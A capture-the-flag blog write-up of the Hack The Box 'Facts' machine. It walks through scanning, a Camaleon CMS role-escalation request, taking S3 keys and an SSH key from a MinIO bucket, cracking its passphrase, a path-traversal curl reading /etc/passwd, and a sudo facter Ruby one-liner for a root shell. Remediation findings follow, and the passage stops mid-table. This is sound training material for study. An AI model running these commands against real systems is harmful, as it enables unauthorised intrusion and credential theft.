@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en" data-color-mode="auto" data-light-theme="light" data-dark-theme="dark">
+<head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>WriteUp: Facts | HTB | MaxisFront</title><meta name="description" content="HTB Facts Machine | Challenge made by: LazyTitan33"><meta property="og:title" content="WriteUp: Facts | HTB"><meta property="og:description" content="HTB Facts Machine | Challenge made by: LazyTitan33"><meta property="og:type" content="article"><meta property="og:url" content="https://maxisfront.me/posts/writeup-facts-htb/"><meta property="og:image" content="https://maxisfront.me/posts/writeup-facts-htb/Facts_Shield.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630"><meta property="og:site_name" content="MaxisFront"><meta property="og:locale" content="en">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="WriteUp: Facts | HTB">
+<meta name="twitter:description" content="HTB Facts Machine | Challenge made by: LazyTitan33"><meta name="twitter:image" content="https://maxisfront.me/posts/writeup-facts-htb/Facts_Shield.png">
+<link rel="canonical" href="https://maxisfront.me/posts/writeup-facts-htb/">
+
+<link rel="alternate" hreflang="es" href="https://maxisfront.me/es/posts/writeup-facts-htb/"><link rel="stylesheet" href="/css/primer.min.c12daf26af408c64f29cc993dd5ab422334e71e50fa7198111b729fdf674e34d.css" integrity="sha256-wS2vJq9AjGTynMmT3Vq0IjNOceUPpxmBEbcp/fZ0400=">
+
+<link rel="stylesheet" href="/css/custom.min.44f76475abc99bc3028656bd061d05d398c1b30eefd8ef829d03d0a85e7e5ff2.css" integrity="sha256-RPdkdavJm8MChla9Bh0F05jBsw7v2O&#43;CnQPQqF5&#43;X/I=">
+
+<link rel="stylesheet" href="/css/syntax.min.174c84898cba6753b1e76756faaba89295a9b36f5a52958e027f347103d8575d.css" integrity="sha256-F0yEiYy6Z1Ox52dW&#43;quokpWps29aUpWOAn80cQPYV10=">
+
+
+<link rel="stylesheet" href="/css/custom_properties.min.976236aa37c1f366275e6eba511733b6b95845d8d5f5516fb394a5be37e10ace.css" integrity="sha256-l2I2qjfB82YnXm66URcztrlYRdjV9VFvs5SlvjfhCs4=">
+
+
+<link rel="icon" href="/favicon.ico" type="image/x-icon">
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-EY36TLSMFS"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-EY36TLSMFS');
+</script>
+<script>
+  (function() {
+    const saved = localStorage.getItem('theme');
+    const html = document.documentElement;
+    if (saved === 'light' || saved === 'dark') {
+      html.setAttribute('data-color-mode', saved);
+    }
+  })();
+</script>
+</head>
+<body>
+  <div class="d-flex flex-column min-height-full"><header class="AppHeader">
+  <div class="AppHeader-globalBar">
+    <div class="AppHeader-globalBar-start">
+      <a href="/" class="AppHeader-logo" aria-label="MaxisFront"><span class="AppHeader-logo-text">MaxisFront</span></a>
+
+      <nav class="AppHeader-nav" aria-label="Main navigation"><a href="/" class="AppHeader-nav-item">Home</a><a href="/posts/" class="AppHeader-nav-item">Posts</a></nav>
+    </div>
+
+    <div class="AppHeader-globalBar-end"><button type="button" id="theme-toggle"
+  class="tooltipped tooltipped-s"
+  aria-label="System theme"
+  data-tooltip-light="Light theme"
+  data-tooltip-dark="Dark theme"
+  data-tooltip-auto="System theme">
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-light" style="display: none;">
+    <path d="M8 12a4 4 0 1 1 0-8 4 4 0 0 1 0 8Zm0-1.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Zm5.657-8.157a.75.75 0 0 1 0 1.061l-1.061 1.06a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734l1.06-1.06a.75.75 0 0 1 1.06 0Zm-9.193 9.193a.75.75 0 0 1 0 1.06l-1.06 1.061a.75.75 0 1 1-1.061-1.06l1.06-1.061a.75.75 0 0 1 1.061 0ZM8 0a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-1.5 0V.75A.75.75 0 0 1 8 0ZM3 8a.75.75 0 0 1-.75.75H.75a.75.75 0 0 1 0-1.5h1.5A.75.75 0 0 1 3 8Zm13 0a.75.75 0 0 1-.75.75h-1.5a.75.75 0 0 1 0-1.5h1.5A.75.75 0 0 1 16 8Zm-8 5a.75.75 0 0 1 .75.75v1.5a.75.75 0 0 1-1.5 0v-1.5A.75.75 0 0 1 8 13Zm3.536-1.464a.75.75 0 0 1 1.06 0l1.061 1.06a.75.75 0 0 1-1.06 1.061l-1.061-1.06a.75.75 0 0 1 0-1.061Zm-9.193-9.193a.75.75 0 0 1 1.06 0l1.061 1.06a.75.75 0 0 1-1.06 1.061L2.343 3.403a.75.75 0 0 1 0-1.06Z"></path>
+  </svg>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-dark" style="display: none;">
+    <path d="M9.598 1.591a.749.749 0 0 1 .785-.175 7.001 7.001 0 1 1-8.967 8.967.75.75 0 0 1 .961-.96 5.5 5.5 0 0 0 7.046-7.046.75.75 0 0 1 .175-.786Zm1.616 1.945a7 7 0 0 1-7.678 7.678 5.499 5.499 0 1 0 7.678-7.678Z"></path>
+  </svg>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor" class="octicon theme-icon-auto" style="display: none;">
+    <path d="M14.25 1c.966 0 1.75.784 1.75 1.75v7.5A1.75 1.75 0 0 1 14.25 12h-3.727c.099 1.041.52 1.872 1.292 2.757A.752.752 0 0 1 11.25 16h-6.5a.75.75 0 0 1-.565-1.243c.772-.885 1.193-1.716 1.292-2.757H1.75A1.75 1.75 0 0 1 0 10.25v-7.5C0 1.784.784 1 1.75 1ZM1.75 2.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25ZM9.018 13H6.982a5.72 5.72 0 0 1-.765 1.5h3.566a5.72 5.72 0 0 1-.765-1.5Z"></path>
+  </svg>
+</button>
+<details class="dropdown details-reset details-overlay AppHeader-dropdown">
+        <summary class="AppHeader-button" aria-haspopup="true" aria-label="Select language">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="16" height="16" fill="currentColor">
+            <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM5.78 8.75a9.64 9.64 0 0 0 1.363 4.177c.255.426.542.832.857 1.215.245-.296.551-.705.857-1.215A9.64 9.64 0 0 0 10.22 8.75Zm4.44-1.5a9.64 9.64 0 0 0-1.363-4.177c-.307-.51-.612-.919-.857-1.215a9.927 9.927 0 0 0-.857 1.215A9.64 9.64 0 0 0 5.78 7.25Zm-5.944 1.5H1.543a6.507 6.507 0 0 0 4.666 5.5c-.123-.181-.24-.365-.352-.552-.715-1.192-1.437-2.874-1.581-4.948Zm-2.733-1.5h2.733c.144-2.074.866-3.756 1.58-4.948.12-.197.237-.381.353-.552a6.507 6.507 0 0 0-4.666 5.5Zm10.181 1.5c-.144 2.074-.866 3.756-1.581 4.948-.111.187-.229.371-.352.552a6.507 6.507 0 0 0 4.666-5.5Zm2.733-1.5a6.507 6.507 0 0 0-4.666-5.5c.123.181.241.365.352.552.715 1.192 1.437 2.874 1.581 4.948Z"></path>
+          </svg>
+          <span class="AppHeader-button-text">English</span>
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16" width="12" height="12" fill="currentColor" class="AppHeader-dropdown-caret">
+            <path d="m4.427 7.427 3.396 3.396a.25.25 0 0 0 .354 0l3.396-3.396A.25.25 0 0 0 11.396 7H4.604a.25.25 0 0 0-.177.427Z"></path>
+          </svg>
+        </summary>
+        <ul class="dropdown-menu dropdown-menu-sw"><li>
+            <a href="/es/posts/writeup-facts-htb/" class="dropdown-item" lang="es">Español</a>
+          </li><li>
+            <a href="/posts/writeup-facts-htb/" class="dropdown-item selected" lang="en">English</a>
+          </li></ul>
+      </details></div>
+  </div>
+</header>
+<main class="flex-auto">
+      <div class="container-xl px-3 px-md-4 px-lg-5 py-4"><div class="Layout Layout--sidebarPosition-end Layout--flowRow-until-md">
+          <div class="Layout-main"><article>
+  <header class="mb-4">
+    <h1 class="f1 lh-condensed mb-2">WriteUp: Facts | HTB</h1><div class="d-flex flex-items-center color-fg-muted f5 mb-3"><time datetime="2026-07-11T00:00:00Z">
+        2026-07-11
+      </time><span class="mx-2">&middot;</span><span>9 min read</span><span class="mx-2">&middot;</span><span>MaxisFront</span></div><div class="d-flex flex-wrap mb-3" style="gap: 0.5rem;"><a href="/tags/linux/" class="topic-tag">Linux</a><a href="/tags/web/" class="topic-tag">Web</a><a href="/tags/wordpress/" class="topic-tag">WordPress</a><a href="/tags/cve-2025-2304/" class="topic-tag">CVE-2025-2304</a><a href="/tags/s3/" class="topic-tag">S3</a><a href="/tags/cve-2024-46987/" class="topic-tag">CVE-2024-46987</a><a href="/tags/gtfobins/" class="topic-tag">GTFOBins</a><a href="/tags/facter/" class="topic-tag">Facter</a></div><img src="/posts/writeup-facts-htb/Facts_Shield.png" alt="WriteUp: Facts | HTB" loading="lazy" class="rounded-2 width-full mb-3" style="max-height: 400px; object-fit: cover;"></header>
+
+  <div class="markdown-body">
+    <blockquote>
+<p>All rights reserved by <strong>Hack The Box LTD</strong>.</p>
+</blockquote>
+
+
+
+
+  
+
+
+<div class="flash mb-3">
+  <blockquote>
+<p>Summary</p>
+</blockquote>
+<ul>
+<li>Exploiting the <code>CVE-2025-2304</code> on <code>CMS Camaleon 2.9.0</code> to escalate privileges through mass attribute assignment</li>
+<li>Obtaining <code>API Key</code> and <code>Secret Key</code> via the compromised <code>CMS</code></li>
+<li>Accessing the internal <code>bucket S3</code> via <code>minio-client</code>, discovering the private key <code>SSH</code></li>
+<li>Exploiting a <code>Path Traversal</code> (<code>CVE-2024-46987</code>) to read sensitive system files</li>
+<li>Privilege escalation using the <code>facter</code> binary with <code>sudo</code> permissions</li>
+<li>Security recommendations to prevent and mitigate vulnerabilities on this machine</li>
+</ul>
+</div>
+
+
+
+<h4 id="skills-used">Skills Used</h4>
+<ul>
+<li>Port and service enumeration</li>
+<li>Directory and web architecture enumeration</li>
+<li>Exploitation of vulnerabilities in <code>CMS</code> (Mass Attribute Assignment)</li>
+<li>Interaction with object storage services (<code>S3</code>) via <code>minio-client</code></li>
+<li>Exploitation of binaries with <code>sudo</code> permissions</li>
+</ul>
+<h4 id="tools-used">Tools Used</h4>
+<ul>
+<li>ping</li>
+<li>nmap</li>
+<li>minio-client</li>
+<li>python3</li>
+<li>ssh2john</li>
+<li>john</li>
+<li>curl</li>
+<li>ssh</li>
+<li>facter</li>
+</ul>
+<hr>
+<h2 id="vulnerability-assesment-and-analysis">Vulnerability Assesment and Analysis</h2>
+<p>The <code>HTB</code> platform provides us with the target <code>IP</code>, which is <code>10.129.16.176</code>—an address that can be reached by connecting through the <code>VPN</code> assigned to us by the platform.</p>
+<p>We verify whether it is possible to establish a connection between the victim machine and ours:</p>
+<img src="/posts/writeup-facts-htb/images/1_Facts-ping-traceroute.png" alt="Arp-Scan output" loading="lazy">
+<p>The ICMP trace route is successful. Thus, the TTL value is <code>63</code>, which <em><strong>could</strong></em> indicate that we are dealing with a <code>Linux/Unix</code> distribution since it is close to 64.</p>
+<h3 id="port-scanning">Port Scanning</h3>
+<p>We performed a scan of the system’s 65,535 <code>TCP</code> ports using the <code>Nmap</code> tool, focusing on those with an open status:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p- --min-rate <span style="color:#bd93f9">5000</span> -Pn -n -oN nmap-scan 10.129.16.176</span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/2_Facts-nmap-scan.png" alt="Enumerating ports through Nmap" loading="lazy">
+<blockquote>
+<p>&lt;= Important =&gt; In enterprise environments, sending large numbers of packets to <code>TCP</code>, <code>ICMP</code>, or <code>UDP</code> often causes network congestion, potentially triggering an accidental <code>DoS</code> attack or causing the traffic to be blocked by monitoring systems.</p>
+</blockquote>
+<h3 id="port-enumeration">Port Enumeration</h3>
+<p>We observe that ports 22 <code>(SSH)</code>, 80 <code>(HTTP)</code>, and 54321 (currently unknown) are active. From this point, we can enumerate the services via <code>Nmap</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>nmap -p22,80,54321 -sCV -oN ports-enum 10.129.16.176</span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/3_Facts-ports-enumeration.png" alt="Discovering services and versions through Nmap" loading="lazy">
+<p>After analyzing the port enumeration, we can summarize the results in the following table:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">Port</th>
+          <th style="text-align: center">Service</th>
+          <th style="text-align: center">Version</th>
+          <th style="text-align: center">Notes</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">22</td>
+          <td style="text-align: center">ssh</td>
+          <td style="text-align: center">OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)</td>
+          <td style="text-align: center">Outdated version and potentially affected by various vulnerabilities (<code>RCE</code>, among others). <em>This is not the primary objective</em></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">80</td>
+          <td style="text-align: center">http</td>
+          <td style="text-align: center">Apache httpd 2.4.52</td>
+          <td style="text-align: center">Seriously outdated web service, potentially affected by <code>CVE-2022-22720</code> and <code>CVE-2022-22719</code>. <em>Not the primary target</em></td>
+      </tr>
+      <tr>
+          <td style="text-align: center">54321</td>
+          <td style="text-align: center">http</td>
+          <td style="text-align: center">Golang net/http server</td>
+          <td style="text-align: center">Possible standard web server or <em>a cloud object storage system</em></td>
+      </tr>
+  </tbody>
+</table>
+<blockquote>
+<p>Tools such as <code>whatweb</code> (command-line tool) or <code>Wappalyzer</code> (browser extension) are very useful when we want to identify only the technologies used by an HTTP service.</p>
+</blockquote>
+<p>Based on the table, we can define possible approaches to the target:</p>
+<blockquote>
+<ul>
+<li>
+<p>Port 22 (<code>SSH</code>): A severely outdated <code>OpenSSH</code> service, possibly running on a <code>Ubuntu 22.04 LTS</code> distribution (<code>Jammy Jellyfish</code>). Potential user enumeration via <code>CVE-2016-6210</code> and a <code>DoS</code>-type attack (<code>CVE-2015-5600</code>). At first glance, these do not appear to be potential direct access paths to the system.</p>
+</li>
+<li>
+<p>Port 80 (<code>HTTP</code>): Web application hosted via an outdated <code>Apache httpd 2.4.52</code> service. Through web enumeration, it is possible to identify other services and potential access points to the victim server.</p>
+</li>
+<li>
+<p>Port 54321 (<code>HTTP</code>): A <code>net/http</code> server written in <code>Go</code>. Given its uses, it could be a microservice application, an internal API, or even a tool for cloud storage environments, enabling communication with services such as <code>S3</code> for managing <code>buckets</code>.</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Before accessing the target website <code>Facts</code>, a temporary <code>mapping</code> is set up from the target IP address to the page. This is done by modifying the file <code>/etc/hosts</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>sudoedit /etc/hosts</span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/4_Facts-map-ip-into-etc-hosts.png" alt="Adding facts IP to the hosts linux file" loading="lazy">
+<p>After accessing <code>facts.htb</code>, we can see that it is a trivia website.</p>
+<img src="/posts/writeup-facts-htb/images/5_Facts-homepage-view.png" alt="Facts web homepage" loading="lazy">
+<p>At first glance, we don’t see any options that would take us to an admin panel or other types of services. Therefore, we perform a URL enumeration using the tool <code>gobuster</code> to gain a broader view of the site’s architecture:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>gobuster dir -w wordlist -u <span style="color:#f1fa8c">&#34;http://facts.htb&#34;</span></span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/6_Facts-urls-enumeration.png" alt="Enumerating url directions through gobuster" loading="lazy">
+<p>The results indicate the presence of an admin panel at the URL <code>http://facts.htb/admin/login</code>. We access it to see what kind of web service it is.</p>
+<img src="/posts/writeup-facts-htb/images/7_Facts-camaleon-administration-panel.png" alt="Discovering camaleon CMS login pannel" loading="lazy">
+<p>We observe that it is an administration panel provided by <code>CMS</code>. Since the option to register an account is enabled, we begin the process.</p>
+<img src="/posts/writeup-facts-htb/images/8_Facts-admin-panel-low-privileges-user.png" alt="Getting into the admin panel with low privileges user" loading="lazy">
+<p>Upon logging in, we notice two items of interest:</p>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center"><code>CMS Camaleon 2.9.0</code></th>
+          <th style="text-align: center">CVE-2025-2304</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center"><code>Camaleon</code> is a <em>Content Management System</em>. This version is affected by the <code>CVE-2025-2304</code>.</td>
+          <td style="text-align: center">This vulnerability exploits an <code>endpoint</code> called <code>updated_ajax</code>, allowing the role of one or more users to be manipulated</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="exploitation">Exploitation</h2>
+<p>From this point on, we focus on attempting to gain access to the <code>Facts</code> system using various methods.</p>
+<h3 id="web-cve-2025-2304">Web: CVE-2025-2304</h3>
+<p>After verifying the existence of a promising attack vector, we used a tool such as <code>Caido</code> to capture and manipulate web requests. After activating it, we directed the requests to our user profile on <code>CMS</code> and attempted to change our password.</p>
+<img src="/posts/writeup-facts-htb/images/9_Facts-capturing-change-password-post-method.png" alt="Capturing the POST request when changing the user password" loading="lazy">
+<p>After capturing the request, we modified the <code>password</code> parameter by adding <code>[role]=admin</code>.</p>
+<img src="/posts/writeup-facts-htb/images/10_Facts-modifying-user-role-through-caido.png" alt="Adding the administrator role to our user" loading="lazy">
+<p>This modification injects the <code>role</code> parameter into the request body, thereby escalating our account’s privileges to those of a privileged user.</p>
+<p>After that, we access the URL <code>/admin/settings/site</code> to enter the site’s configuration. Next, we navigate to the section <code>Filesystem Settings</code>. Here we can discover that the server runs the <code>Amazon S3</code> service for cloud object storage, which operates on port <code>54321</code> (previously discovered).</p>
+<img src="/posts/writeup-facts-htb/images/11_Facts-obtaining-s3-bucket-credentials.png" alt="Getting the Access and Secret key from the Amazon S3" loading="lazy">
+<p>To capitalize on the discovery made at <code>Filesystem Settings</code>, we retrieve the <code>access key</code> and <code>secret key</code>, and then establish a connection to the server via <code>MiNIO</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>minio-client <span style="color:#8be9fd;font-style:italic">alias</span> <span style="color:#8be9fd;font-style:italic">set</span> facts_htb http://facts.htb:54321/</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>minio-client</code>: A dedicated tool for managing and interacting with object storage systems via <code>Amazon S3</code></li>
+</ul>
+</blockquote>
+<p>After running the command, we received the following response: <code>Added facts_htb successfully</code></p>
+<img src="/posts/writeup-facts-htb/images/12_Facts-setting-s3-cloud-storage-alias.png" alt="Setting the alias for the S3 bucket" loading="lazy">
+<p>After creating a shortcut to the storage server, we can list the <code>buckets</code> and objects within the server; through this capability, we can identify the existence of the <em>bucket</em> <code>internal</code>, which contains the folder <code>.ssh</code>.</p>
+<p>We list the contents to search for potentially valuable files:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>minio-client ls facts_htb/internal/.ssh</span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/13_Facts-listing-ssh-keys.png" alt="Discovering the SSH private key inside the bucket" loading="lazy">
+<p>We observe that inside the folder there is a private key (<code>id_ed25519</code>) for connections to <code>SSH</code>. If this key is protected by a very simple <code>passphrase</code>, it can be quickly cracked using a dictionary attack, allowing us to subsequently gain remote access to the target server of interest.</p>
+<p>To crack it, we must first convert the key into a hash that can be used by tools such as <code>John the Ripper</code> or <code>Hashcat</code>. In this case, we’ll use <code>John</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>python3 ssh2john.py id_ed25519 &gt; id.hash</span></span></code></pre></div><blockquote>
+<p>Link to the utility: <a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py">https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py</a></p>
+</blockquote>
+<p>After that, we’ll proceed to crack it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>john --wordlist<span style="color:#ff79c6">=</span>/usr/share/wordlist/rockyou.txt id.hash</span></span></code></pre></div><blockquote>
+<ul>
+<li><code>john</code>: A tool for decrypting and auditing passwords.</li>
+<li><code>--wordlist=path/to/wordlist</code>: A dictionary of words or combinations used for the comparison process with the file hash.</li>
+<li><code>&lt;fileHash-to-crack&gt;</code>: Irreversibly encrypted password.</li>
+</ul>
+</blockquote>
+<img src="/posts/writeup-facts-htb/images/14_Facts-discovered-ssh-passphrase.png" alt="Getting passphrase through John The Ripper" loading="lazy">
+<p>After discovering the <em>passphrase</em>, we need to identify the user who owns the private key <code>SSH</code>.</p>
+<h3 id="web-cve-2024-46987">Web: CVE-2024-46987</h3>
+<p>In specific variants of <code>Camaleon v2.9.0</code>, it is possible to perform a <code>Path Traversal</code>, allowing us to access remote files on the victim server, such as <code>/etc/passwd</code>.</p>
+<p>If we wish to carry out the exploit via <code>CLI</code>, we can run the following command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>curl --cookie <span style="color:#f1fa8c">&#34;_factsapp_session=Cookie ; auth_token=Cookie&#34;</span> <span style="color:#f1fa8c">&#34;http://facts.htb/admin/media/download_private_file?file=../../../../../../../etc/passwd&#34;</span> | grep <span style="color:#f1fa8c">&#34;bash&#34;</span></span></span></code></pre></div><blockquote>
+<ul>
+<li><code>-b</code> / <code>--cookie</code>: ability to inject one or more <code>cookies</code> session tokens</li>
+</ul>
+</blockquote>
+<img src="/posts/writeup-facts-htb/images/15_Facts-passwd-file-content.png" alt="Listing the users in the server through the /etc/passwd file" loading="lazy">
+<p>We can see that there are 3 existing users on the machine: <code>root</code>, <code>trivia</code>, and <code>william</code>.</p>
+<h3 id="ssh">SSH</h3>
+<p>By performing a <code>password spraying</code> on the three existing users, we discovered that the cracked password belongs to the user <code>trivia</code>. After that, we logged in as <code>SSH</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>ssh -i id_ed25519 trivia@10.129.16.176 <span style="color:#6272a4">#dragonballz</span></span></span></code></pre></div><p>After logging in, we listed the commands we can execute with the privileges of the user <code>root</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span>sudo -l</span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/16_Facts-listing-binaries-with-sudo-permissions.png" alt="Listing the binaries with sudo privileges" loading="lazy">
+<p>We observed that we have the ability to execute the command <code>facter</code> (a tool designed to list a large amount of data about the system in use).</p>
+<p>Upon investigating <code>GTFOBins</code>, we found that the command <code>facter</code> allows us to run <em>custom</em> scripts written in <code>Ruby</code>.</p>
+<img src="/posts/writeup-facts-htb/images/17_Facts-gftobins-facter.png" alt="GTFOBins page about the facter binary" loading="lazy">
+<p>To exploit this, we used the <code>--custom-dir</code> flag to abuse this feature and wrote the malicious script:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code data-lang="bash"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">&#34;require &#39;facter&#39;; Facter.add(:get_bash){setcode{system(&#39;/bin/bash&#39;)}}&#34;</span> &gt; exploit.rb
+</span></span><span style="display:flex;"><span>sudo facter --custom-dir /tmp get_bash</span></span></code></pre></div><img src="/posts/writeup-facts-htb/images/18_Facts-getting-root-through-facter-binary.png" alt="Escalating privileges through custom Ruby code" loading="lazy">
+<p>We now have a <code>bash</code> session as the user <code>root</code>, giving us full control of the <code>Facts</code> system.</p>
+<h2 id="impact">Impact</h2>
+<p>An attacker with the permissions of a regular user such as <code>trivia</code> is capable of:</p>
+<blockquote>
+<ul>
+<li>Execute <code>scripts</code> and establish persistent sessions.</li>
+<li>Ability to enumerate other systems on the network and perform lateral movement.</li>
+</ul>
+</blockquote>
+<p>An attacker with administrator privileges gains the following capabilities:</p>
+<blockquote>
+<ul>
+<li>Establish persistence across sessions and control server traffic.</li>
+<li>Exfiltrate sensitive data (database or internal storage via <code>S3/MinIO</code>).</li>
+<li>Manipulating <code>cronjobs</code> to execute malicious tasks.</li>
+<li>Installing <code>backdoors</code> at the kernel level.</li>
+</ul>
+</blockquote>
+<h1 id="summary">Summary</h1>
+<p>The <code>Facts</code> machine exhibited a series of critical vulnerabilities (<strong>not all of which</strong> <strong>are detailed in this write-up</strong>), such as a <code>Path Traversal</code> followed by a <code>RCE</code>, as well as a <code>Credential Reuse</code> and an <code>SUID</code> exploit, among others. Therefore, the following sections will outline the findings, their severity, and guidelines for preventing this type of security breach.</p>
+<h3 id="findings">Findings</h3>
+<blockquote>
+<p>Mass Attribute Assignment and Privilege Escalation on <code>CMS Camaleon</code></p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerability</strong></th>
+          <th style="text-align: center"><strong>Severity</strong></th>
+          <th style="text-align: center">Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF1</td>
+          <td style="text-align: center">CWE-915: Improper Modification of Dynamically Determined Attributes</td>
+          <td style="text-align: center"><span style="background-color: #cc0000; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     Critical 
+</span>
+
+
+
+</td>
+          <td style="text-align: center"><code>CMS</code> does not properly validate the request <code>POST</code> when changing a password, allowing injection of the parameter <code>role</code> to escalate privileges to administrator level</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Immediate Actions</p>
+<blockquote>
+<ul>
+<li>Immediately update the <code>CMS Camaleon</code> system to a patched version supported by the client.</li>
+<li>Implement server-side measures <code>Zero Trust</code> to ignore or reject unauthorized parameters during user profile updates (<code>whitelisting</code>).</li>
+<li>Strictly limit user creation if interaction with external users is not required.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+<blockquote>
+<p>Insecure Storage of Cryptographic Keys and Use of Weak Passwords</p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerability</strong></th>
+          <th style="text-align: center"><strong>Severity</strong></th>
+          <th style="text-align: center">Description</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">MF2</td>
+          <td style="text-align: center">CWE-1391 and CWE-312: Use of Weak Credentials and Storage of Sensitive Information in Plaintext</td>
+          <td style="text-align: center"><span style="background-color: #ff4444; color: white; padding: 2px 8px; border-radius: 4px; font-weight: bold; font-size: 0.85em; display: inline-block; text-transform: uppercase;">
+     High 
+</span>
+
+
+
+</td>
+          <td style="text-align: center">Exposure of the SSH private key <code>id_ed25519</code> on the local <code>bucket S3</code>, which is in turn protected by a password vulnerable to dictionary attacks</td>
+      </tr>
+  </tbody>
+</table>
+
+
+
+
+ 
+
+
+<div class="flash flash-error mb-3">
+  <p>Immediate Actions</p>
+<blockquote>
+<ul>
+<li>Implement strict read permissions for the internal <code>S3</code> bucket, limiting access exclusively to essential services and <code>IP</code> addresses through a strict <code>Firewall</code>.</li>
+<li>Revoke the compromised SSH key and generate a new key pair using a strong <code>passphrase</code> (minimum 16 characters, <em>including</em> alphanumeric characters and symbols).</li>
+<li>Avoid storing cryptographic keys in shared object storage services.</li>
+</ul>
+</blockquote>
+</div>
+
+
+
+<blockquote>
+<p>Exposure of Sensitive Files via <code>Path Traversal</code></p>
+</blockquote>
+<table>
+  <thead>
+      <tr>
+          <th style="text-align: center">ID</th>
+          <th style="text-align: center"><strong>Vulnerability</strong></th>
